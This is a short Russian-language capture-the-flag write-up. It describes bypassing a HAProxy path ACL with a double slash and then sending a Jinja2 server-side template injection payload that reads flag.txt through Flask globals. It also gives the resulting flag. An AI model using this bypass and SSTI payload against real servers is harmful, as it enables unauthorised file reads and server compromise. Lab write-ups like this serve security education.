# Web3

Скачиваем архив, изучаем содержимое haproxy.cfg:

`acl restricted_page path_beg,url_dec -i /flag`

Понимаем, что regex явно кривой - обходим его с помощью **//flag**.

Формируем иньекцию для SSTI, засылаем уже готовый пейлоад в параметр `name`.

```
PoC
http://192.168.12.11:8001//flag?name={{%20get_flashed_messages.__globals__.__builtins__.open(%22flag.txt%22).read()%20}}
```

Отправляем запрос и получаем флаг: `nto{Ht1P_sM088Lin6_88Ti}`
